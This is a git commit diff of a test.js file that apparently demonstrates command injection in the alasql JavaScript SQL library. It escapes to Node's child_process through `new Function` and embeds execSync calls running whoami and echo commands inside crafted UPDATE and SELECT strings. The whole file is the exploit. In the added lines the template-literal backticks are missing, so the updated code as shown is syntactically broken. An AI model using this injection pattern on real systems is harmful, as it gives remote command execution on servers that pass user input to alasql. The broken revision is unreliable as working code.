d8b8caa4d4ed3a1325a7cb876ebbe75a26dca2c0
vr2 <hydw9898@gmail.com>
2024-11-15 11:02:56 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,14 +1,14 @@
 const genPayload = command => 
-  new Function(
+new Function(
     'return this.process.mainModule.require'
-  )()('child_process').execSync(`${command}`).toString().trim();  // execSync 실행 결과를 문자열로 변환하고 앞뒤 공백 제거
+)()('child_process').execSync(${JSON.stringify(command)})
+;
+
 
 alasql('CREATE table i_am_a_table;' +
-    'INSERT INTO i_am_a_table VALUES (1337);' +
-
-    // whoami의 결과값을 42 대신에 넣기
-    `UPDATE i_am_a_table SET [0'+${genPayload("whoami")}+'] = '${genPayload("whoami")}';` +  // whoami 결과를 테이블에 저장
-    `SELECT * from i_am_a_table where whatever=['+${genPayload(">&2 echo SELECT pwned $(whoami)")}+'];` +
-    `SELECT \'+${genPayload(">&2 echo SELECT pwned again, back-quote works too. $(whoami)")}+'\ from i_am_a_table where 1;` +
-    `SELECT [whatever||${genPayload('>&2 echo calling function pwned')}||]('whatever');`
+    INSERT INTO i_am_a_table VALUES (1337); +
+    UPDATE i_am_a_table SET [0'+${genPayload(">&2 echo UPDATE pwned $(whoami)")}+']=[0'+${genPayload(">&2 echo UPDATE pwned $(whoami)")}+']; +
+    SELECT * from i_am_a_table where whatever=['+${genPayload(">&2 echo SELECT pwned $(whoami)")}+']; +
+    SELECT \'+${genPayload(">&2 echo SELECT pwned again, back-quote works too. $(whoami)")}+'\ from i_am_a_table where 1; +
+    SELECT [whatever||${genPayload('>&2 echo calling function pwned')}||]('whatever');
 );
